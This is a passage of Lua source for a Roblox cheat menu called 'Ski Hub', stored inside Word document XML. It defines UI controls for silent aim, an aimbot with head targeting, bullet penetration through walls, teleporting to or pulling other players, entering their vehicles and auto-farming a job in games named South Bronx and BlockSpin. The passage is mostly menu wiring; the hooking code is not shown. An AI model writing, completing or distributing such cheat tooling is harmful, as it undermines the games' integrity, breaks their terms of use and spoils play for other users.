      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerRemoving:Connect(RefreshPlayers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Column = PlayersTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerOptionsSection = Column:section({name = "Player Options", size = 1, default = false, side = 'right', icon = GetImage("Wrench.png")})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Spectate Player", flag = "SpectatePlayer_SouthBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.PlayerUtilities.SpectatePlayer = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Bring Player", flag = "BringPlayer_SouthBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.PlayerUtilities.BringingPlayer = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Teleport To Player", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.South_Bronx.PlayerUtilities.SelectedPlayer then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Success, Error = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(Players[Config.South_Bronx.PlayerUtilities.SelectedPlayer].Character.HumanoidRootPart.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (LocalPlayer.Character.HumanoidRootPart.Position - Players[Config.South_Bronx.PlayerUtilities.SelectedPlayer].Character.HumanoidRootPart.Position).Magnitude &gt; 20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`Failed to teleport to {Config.South_Bronx.PlayerUtilities.SelectedPlayer}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Success then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`Successfully teleported to {Config.South_Bronx.PlayerUtilities.SelectedPlayer}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                info = `Failed to teleport to {Config.South_Bronx.PlayerUtilities.SelectedPlayer}. Error : {Error}`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Get Into Players Car", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(SitInPlayersVehicle, Players[Config.South_Bronx.PlayerUtilities.SelectedPlayer])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})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>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Game_Name == "BlockSpin" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    window:seperator({name = ""}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local LocalPlayerTab, PlayersTab, PurchaseGunTab, MiscTab = window:tab({name = "Main", tabs = {"Local Player"}, icon = GetImage("World.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local LocalPlayerColumn = LocalPlayerTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local LocalPlayerModsSection = LocalPlayerColumn:section({name = "Local Player Modifications", side = "left", size = 0.475})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local FarmingSection = LocalPlayerColumn:section({name = "Auto-Farming Utilities", side = "left", size = 0.475, icon = GetImage("Wheatt.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _ScriptLoaded = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            FarmingSection:dropdown({name = "Mope Type", flag = "MopType_BlockSpin", width = 120, items = {"Default", "Silver", "Gold", "Diamond"}, seperator = false, multi = false, default = 'Default', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Config.BlockSpin.AutoFarming.MopType = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            FarmingSection:toggle({name = "Auto-Farm Mop Job", flag = "JanitorFarm_BlockSpin", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Config.BlockSpin.AutoFarming.FarmMops = state</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.BlockSpin.AutoFarming.FarmMops then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Start_MopFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Stop_MopFarm()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _ScriptLoaded = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--window:seperator({name = ""}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local SilentAimTab = window:tab({name = "Silent Aim", tabs = {"General Settings"}, icon = GetImage("Pistol.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SilentAimColumn = SilentAimTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local GeneralSection = SilentAimColumn:section({name = "General", side = "left", size = 0.23, icon = GetImage("UZI.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GeneralSection:toggle({type = "toggle", name = "Enabled", flag = "SilentAim_Enabled", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GeneralSection:keybind({name = "Keybind", flag = "SilentAim_Bind", mode = "Always", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.Targetting = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SettingsSection = SilentAimColumn:section({name = "Settings", side = "left", size = 0.455, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:toggle({name = "Visible Check", flag = "SilentAim_Wallcheck", type = "toggle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.WallCheck = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local BodyParts = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local RigType = "R15"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RigType = LocalPlayer.Character:WaitForChild("Humanoid").RigType.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RigType = LocalPlayer.Character:WaitForChild("Humanoid").RigType.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        BodyParts = (RigType == "R6") and {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Head",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Torso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Left Arm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Right Arm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Left Leg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Right Leg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "HumanoidRootPart"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        } or (RigType == "R15") and {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Head",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "UpperTorso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LowerTorso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftUpperArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftLowerArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightUpperArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightLowerArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftUpperLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftLowerLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightUpperLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightLowerLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "HumanoidRootPart"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        } or {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:dropdown({name = "Target Parts", flag = "Silent_TargetPart", width = 110, items = BodyParts, seperator = false, multi = true, default = {'Head'}, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            table.clear(Config.Silent.TargetPart)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in state do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.insert(Config.Silent.TargetPart, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:slider({name = "Max Distance", flag = "MaxDistance_Silent", min = 0, max = (Game_Name == "South Bronx") and 300 or 3000, default = (Game_Name == "South Bronx") and 300 or 1000, suffix = "st", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.MaxDistance = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:slider({name = "Hit Chance", flag = "SilentAim_HitChance", min = 0, max = 100, default = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.HitChance = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local BulletSettingsSection = SilentAimColumn:section({name = "Bullet Settings", side = "left", size = 0.18, icon = GetImage("Bullet.png")})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        BulletSettingsSection:toggle({type = "toggle", name = "Bullet Penetration", flag = "SilentAim_WallBang", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.WallBang = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SilentAimColumn = SilentAimTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local FieldOfViewSection = SilentAimColumn:section({name = "Field Of View", side = "right", size = 0.23, icon = GetImage("FieldOfView2.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSection:toggle({type = "toggle", name = "Enabled", flag = "SilentAim_Usefov", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.UseFieldOfView = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSection:toggle({type = "toggle", name = "Draw Circle", flag = "SilentAim_DrawCircle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.DrawFieldOfView = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end}):colorpicker({flag = "SilentAim_FOVColor", default = Color3.new(1,1,1), alpha = 0.25, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.FieldOfViewColor = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.FieldOfViewTransparency = 1 - alpha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local FieldOfViewSettingsSection = SilentAimColumn:section({name = "Field Of View Settings", side = "right", size = 0.3, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSettingsSection:slider({name = "Radius", flag = "SilentAim_Radius", min = 0, max = 1000, default = 100, suffix = "°", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.Radius = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSettingsSection:slider({name = "Sides", flag = "SilentAim_Sides", min = 3, max = 100, default = 25, suffix = "°", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.Sides = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SnaplineSection = SilentAimColumn:section({name = "Snapline", side = "right", size = 0.275, icon = GetImage("Snapline.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SnaplineSection:toggle({type = "toggle", name = "Enabled", flag = "SilentAim_Snapline", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.Snapline = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end}):colorpicker({flag = "SilentAim_SnaplineColor", default = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.SnaplineColor = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SnaplineSection:slider({name = "Snapline Thickness", flag = "SilentAim_SnaplineThickness", min = 1, max = 5, default = 1, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Silent.SnaplineThickness = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local AimlockTab = window:tab({name = "AimBot", tabs = {"General Settings"}, icon = GetImage("Aimlock.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AimlockAimColumn = AimlockTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local GeneralSection = AimlockAimColumn:section({name = "General", side = "left", size = 0.23, icon = GetImage("UZI.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GeneralSection:toggle({type = "toggle", name = "Enabled", flag = "AimlockAim_Enabled", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GeneralSection:keybind({name = "Keybind", flag = "AimlockAim_Bind", mode = "Toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Aiming = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            TargetTable[1] = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SettingsSection = AimlockAimColumn:section({name = "Settings", side = "left", size = 0.51, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:toggle({name = "Visible Check", flag = "AimlockAim_Wallcheck", type = "toggle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.WallCheck = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local BodyParts = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local RigType = "R15"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RigType = LocalPlayer.Character:WaitForChild("Humanoid").RigType.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RigType = LocalPlayer.Character:WaitForChild("Humanoid").RigType.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        BodyParts = (RigType == "R6") and {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Head",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Torso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Left Arm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Right Arm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Left Leg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Right Leg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "HumanoidRootPart"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        } or (RigType == "R15") and {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Head",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "UpperTorso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LowerTorso",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftUpperArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftLowerArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightUpperArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightLowerArm",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftUpperLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "LeftLowerLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightUpperLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RightLowerLeg",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "HumanoidRootPart"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        } or {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:dropdown({name = "Aimlock Type", flag = "Aimlock_AimType", width = 110, items = {'Camera', 'Mouse'}, seperator = false, multi = false, default = 'Mouse', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Type = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:dropdown({name = "Target Parts", flag = "Aimlock_TargetPart", width = 110, items = BodyParts, seperator = false, multi = false, default = 'Head', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.TargetPart = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SettingsSection:slider({name = "Max Distance", flag = "MaxDistance_Aimlock", min = 0, max = 3000, default = ((Game_Name == "South Bronx") and 300 or 1000), suffix = "st", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.MaxDistance = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
